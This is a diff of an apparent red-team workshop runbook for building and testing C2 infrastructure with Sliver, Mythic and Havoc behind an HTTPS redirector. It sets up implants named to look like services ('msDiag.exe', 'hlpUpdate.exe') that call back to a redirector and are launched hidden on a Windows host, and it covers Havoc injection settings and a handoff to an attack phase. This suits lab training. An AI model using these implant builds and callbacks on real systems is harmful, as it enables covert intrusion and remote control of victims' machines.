@@ -49,7 +49,7 @@ From the Windows operator, use the MobaXterm **Sliver (SSH)** bookmark under the
 
 Success: you land at `admin@sliver:~$`.
 
-If it fails: Sliver has no public IP; both paths route through the internal VPC. If SSH hangs at the banner, the host may be memory-exhausted from a prior `generate` on an undersized instance. Confirm `sliver_instance_type = "t3.medium"` and reboot the instance if needed.
+If it fails: Sliver has no public IP; both paths route through the internal VPC. If SSH hangs at the banner, the host may be memory-exhausted from a prior `generate`; reboot the instance.
 
 ### Step A2. Connect the client and start the listener
 
@@ -65,10 +65,13 @@ First session per deployment only, import the profile (Sliver persists it afterw
 c2profiles import --file /home/admin/redstack-c2-profile.json --name redstack
 ```
 
-Start the HTTPS listener on port 443. Sliver auto-generates a self-signed cert for it, which the redirector accepts (it re-encrypts to this listener with verification disabled):
+Start the HTTPS listener on port 443. Sliver auto-generates a self-signed cert for it, which the redirector accepts (it re-encrypts to this listener with verification disabled). Run these one at a time:
 
 ```text
 https --lhost 0.0.0.0 --lport 443
+```
+
+```text
 jobs
 ```
 
@@ -125,89 +128,53 @@ If it fails: see the wiki Sliver > Troubleshooting > "Implant compiles but never
 
 ## Phase B: Mythic
 
-Mythic ships with the HTTP profile and Apollo agent pre-installed, the token pre-baked into the HTTP profile, and the web UI reachable from the Windows operator browser only.
+Mythic ships with the HTTP profile and Apollo agent pre-installed, the token pre-baked into the profile, and the web UI reachable from the Windows operator browser only. Go straight to building the payload.
 
-### Step B1. Confirm the stack is up
+### Step B1. Log in and build the Apollo payload
 
-Guacamole > Mythic (SSH), or the MobaXterm bookmark:
+From the Windows operator (Guacamole RDP), open Chromium to `https://mythic:7443` and log in as `mythic_admin` / `<LAB_PASSWORD>`. If the portal will not load or the `http` profile is not accepting connections, see the wiki Mythic > Troubleshooting.
 
-```bash
-cd /opt/Mythic
-sudo ./mythic-cli status
-```
+Left sidebar > Create Payload. Under Apollo, click **Start Fresh** to begin a new payload build, then set:
 
-Success: `apollo` and `http` both show `running` under Installed Services.
+- Target OS: Windows
+- Payload: Apollo; Output Format `WinExe`
+- Commands: keep the default set (`shell`, `ps`, `run`, `upload`) and add `whoami`
+- C2 Profiles: pick `http`, click + INCLUDE PROFILE
 
-If either shows `Created` (installed but not started) or is missing, install and start each, one command at a time (do not lump them, and do not chain `stop && start`):
+On the `http` profile, set only these fields, in the order they appear in the UI. Leave everything else (encryption, kill date, and so on) at its default:
 
-```bash
-sudo ./mythic-cli install github https://github.com/MythicC2Profiles/http
-```
+| Field             | Value                                                                             |
+| ----------------- | --------------------------------------------------------------------------------- |
+| callback_host     | `https://<REDIR_PUBLIC_IP>`                                                       |
+| callback_interval | `2` (seconds)                                                                     |
+| callback_jitter   | `20` (percent)                                                                    |
+| callback_port     | `443`                                                                             |
+| headers           | Add a new header: KEY `X-Request-ID`, VALUE `<TOKEN>`. Then delete the default `Host` header |
+| post_uri          | `cdn/media/stream/update` (no leading `/`)                                        |
 
-```bash
-sudo ./mythic-cli install github https://github.com/MythicAgents/apollo
-```
+The `http` profile already carries a default User-Agent (browser-fingerprint) header; leave it. The default `Host` header, however, must be deleted, or the redirector sees the wrong Host and the callback never lands.
 
-```bash
-sudo ./mythic-cli restart
-```
-
-If `status` still shows either as `Created` rather than `running`, start the two services explicitly (this is the usual fix for the post-install `Created` state):
-
-```bash
-sudo ./mythic-cli start apollo http
-```
-
-```bash
-sudo ./mythic-cli status
-```
-
-Portal note: on a cold boot the web UI can take ~3 minutes beyond the containers coming up. nginx crash-loops on a missing self-signed cert until `mythic_server` writes it, then serves normally. Red `cannot load certificate` lines in `mythic-cli logs mythic_nginx` during that window are expected. Browse to the portal only after the login page returns, not during the crash-loop.
-
-### Step B2. Log in and confirm the HTTP profile
-
-From the Windows operator (Guacamole RDP), open Chromium to `https://mythic:7443`. Login `mythic_admin` / `<LAB_PASSWORD>`. Go to Installed Services > C2 Profiles; the `http` row should show Container Status Online and C2 Server Status Accepting Connections. If Stopped, click Start Profile.
-
-Success: HTTP profile online and accepting connections.
-
-If it fails: the stack takes 5 to 10 minutes after cloud-init. If login fails, confirm the username is `mythic_admin` and pull the password with `sudo cat /opt/Mythic/.env | grep MYTHIC_ADMIN_PASSWORD`.
-
-### Step B3. Build the Apollo payload
-
-Left sidebar > Create Payload:
-
-1. Target OS: Windows.
-2. Payload: Apollo. Output Format: `WinExe`.
-3. Commands: accept the default set (includes `shell`, `ps`, `run`, `upload`).
-4. C2 Profiles: pick `http`, click + INCLUDE PROFILE, then configure:
-
-   | Field                      | Value                                          |
-   | -------------------------- | ---------------------------------------------- |
-   | `callback_host`            | `https://<REDIR_PUBLIC_IP>`                    |
-   | `callback_port`            | `443`                                          |
-   | `callback_interval`        | `10` (seconds)                                 |
-   | `callback_jitter`          | `20` (percent)                                 |
-   | `post_uri`                 | `cdn/media/stream/update` (no leading `/`)     |
-   | `headers`                  | + Custom, KEY `X-Request-ID`, VALUE `<TOKEN>`  |
-   | `encrypted_exchange_check` | leave enabled                                  |
-
-5. Build: Next, name it `msDiag.exe` (service-like, m = Mythic), Create Payload.
-
-Success: Payload successfully built popup with a Download link. Save to `C:\Users\Administrator\Downloads\`.
-
-If it fails: if the build hangs > 3 minutes, `sudo ./mythic-cli logs apollo`.
-
-### Step B4. Execute and confirm
-
-The payload is already on the Windows host (the UI runs there). From PowerShell:
+Name the payload `msDiag.exe` (service-like, m = Mythic) and click Create Payload. It lands in `C:\Users\Administrator\Downloads\`; move it to the Desktop so it launches next to the other beacons:
 
 ```powershell
-Start-Process -FilePath "C:\Users\Administrator\Downloads\msDiag.exe" -WindowStyle Hidden
+Move-Item C:\Users\Administrator\Downloads\msDiag.exe C:\Users\Administrator\Desktop\
 ```
 
-In the Mythic UI, open Active Callbacks (phone icon). A `windows` / Administrator row appears within ~10 seconds. Open its tasking pane and run `ps` to confirm.
+### Step B2. Execute and confirm
 
-Success: callback registered, `ps` returns the process table. Leave the callback active as the Mythic heartbeat.
+From PowerShell on the Windows host:
+
+```powershell
+Start-Process -FilePath "C:\Users\Administrator\Desktop\msDiag.exe" -WindowStyle Hidden
+```
+
+In the Mythic UI, open Active Callbacks (phone icon). A `windows` / Administrator row appears within a few seconds. Open its tasking pane and run:
+
+```text
+whoami
+```
+
+Success: the callback registers and `whoami` returns `windows\administrator`. Leave the callback active as the Mythic heartbeat.
 
 If it fails: see the wiki Mythic > Troubleshooting > "Callback never arrives" (listener, network path via redirector curl test, build params header/`post_uri`, Defender).
 
@@ -219,14 +186,19 @@ Havoc compiles from source once per deploy (~9 min). If you did not kick off the
 
 ### Step C1. Build (once per deploy) and verify the teamserver
 
-Guacamole > Havoc (SSH):
+If you did not already build in DEPLOY Step 10, run the build from a terminal on the Havoc Desktop (Guacamole > Havoc Desktop VNC), not over SSH, so the ~9 min compile cannot hang an SSH session:
 
 ```bash
-~/build_havoc.sh          # skip if already built this deploy
-tail -f ~/havoc_build.log # optional, watch for "Havoc Build Complete"
+~/build_havoc.sh
 ```
 
-Then confirm the teamserver:
+Optionally watch the log for `Havoc Build Complete`:
+
+```bash
+tail -f ~/havoc_build.log
+```
+
+Then confirm the teamserver over Guacamole > Havoc (SSH):
 
 ```bash
 sudo systemctl status havoc
@@ -273,7 +245,7 @@ Menu: View > Listeners > Add.
 
 Save.
 
-Success: the `http` listener shows running in the Listeners tab.
+Success: the `https` listener shows running in the Listeners tab.
 
 If it fails: listener won't start usually means a port already bound or a malformed URI.
 
@@ -281,24 +253,24 @@ If it fails: listener won't start usually means a port already bound or a malfor
 
 Menu: Attack > Payloads.
 
-1. Listener: `http`.
+1. Listener: `https`.
 2. Arch: `x64`. Format: `Windows Exe`.
 3. Injection > Spawn64: `C:\Windows\System32\notepad.exe`
 4. Injection > Spawn32: `C:\Windows\SysWOW64\notepad.exe`
-5. Leave Sleep technique, Indirect Syscall, AMSI/ETW at defaults. Generate.
+5. Leave Sleep technique, Indirect Syscall, AMSI/ETW at defaults. Generate, and save the demon as `hlpUpdate.exe` to `/home/admin/Desktop/` (service-like, h = Havoc).
 
-Spawn64 and Spawn32 are required; blank causes a silent build failure. Demon saves to `/home/admin/Desktop/demon.x64.exe`.
+Spawn64 and Spawn32 are required; blank causes a silent build failure.
 
-Success: `demon.x64.exe` on the Havoc desktop.
+Success: `hlpUpdate.exe` on the Havoc desktop.
 
 If it fails: silent failure is almost always empty Spawn fields.
 
 ### Step C5. Transfer, execute, confirm, leave running
 
-Havoc always writes the demon as `demon.x64.exe`; rename it to the service-like name on transfer (h = Havoc) so it matches the ATTACK reuse. From PowerShell on the Windows host, one command at a time:
+From PowerShell on the Windows host, one command at a time:
 
 ```powershell
-scp admin@havoc:/home/admin/Desktop/demon.x64.exe C:\Users\Administrator\Desktop\hlpUpdate.exe
+scp admin@havoc:/home/admin/Desktop/hlpUpdate.exe C:\Users\Administrator\Desktop\hlpUpdate.exe
 ```
 
 ```powershell
@@ -328,4 +300,16 @@ sudo /home/admin/test_redirector.sh
 
 All three entries under "Testing direct backend connectivity" should show `OK`.
 
-Leave all three beacons running. They are your heartbeats: if the redirector, a listener, or VPC peering breaks during the workshop, the af
+Leave all three beacons running. They are your heartbeats: if the redirector, a listener, or VPC peering breaks during the workshop, the affected beacon goes quiet first. Watch live C2 traffic on the redirector to spot a dead beacon:
+
+```bash
+sudo tail -f /var/log/apache2/redirector-ssl-access.log
+```
+
+All three beacons hit 443, so they all land in `redirector-ssl-access.log`. You should see periodic GET/POST at each beacon's callback interval, prefixed by C2: `/cloud/storage/objects/` (Sliver), `/cdn/media/stream/` (Mythic), `/edge/cache/assets/` (Havoc). A prefix that stops appearing is your early warning.
+
+---
+
+## Where this hands off
+
+Three validated callback paths, three live heartbeats on the Windows operator, redirector confirmed. ATTACK uses the Sliver path to land a beacon on ShadowGate and escalate; the Mythic and Havoc heartbeats stay up as config health checks throughout.
